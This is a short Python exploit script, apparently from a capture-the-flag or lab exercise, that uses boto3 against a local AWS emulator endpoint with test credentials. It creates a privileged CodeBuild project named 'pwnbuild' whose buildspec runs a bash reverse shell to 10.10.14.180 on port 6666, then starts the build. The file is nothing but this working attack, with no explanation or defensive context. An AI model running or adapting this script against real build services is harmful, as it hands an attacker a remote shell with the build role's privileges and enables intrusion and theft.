import boto3

ENDPOINT = "http://172.18.0.2:4566"
cb = boto3.client(
    "codebuild",
    endpoint_url=ENDPOINT,
    region_name="us-east-1",
    aws_access_key_id="test",
    aws_secret_access_key="test",
)

buildspec = """version: 0.2
phases:
  build:
    commands:
      - bash -c 'bash -i >& /dev/tcp/10.10.14.180/6666 0>&1'
"""

try:
    cb.create_project(
        name="pwnbuild",
        source={"type": "NO_SOURCE", "buildspec": buildspec},
        artifacts={"type": "NO_ARTIFACTS"},
        environment={
            "type": "LINUX_CONTAINER",
            "computeType": "BUILD_GENERAL1_SMALL",
            "image": "bash:latest",
            "privilegedMode": True,
        },
        serviceRole="arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/codebuild-role",
    )
    print("CREATED")
except Exception as e:
    print("CREATE_ERR", e)

try:
    resp = cb.start_build(projectName="pwnbuild")
    print("STARTED", resp.get("build", {}).get("id"))
except Exception as e:
    print("START_ERR", e)
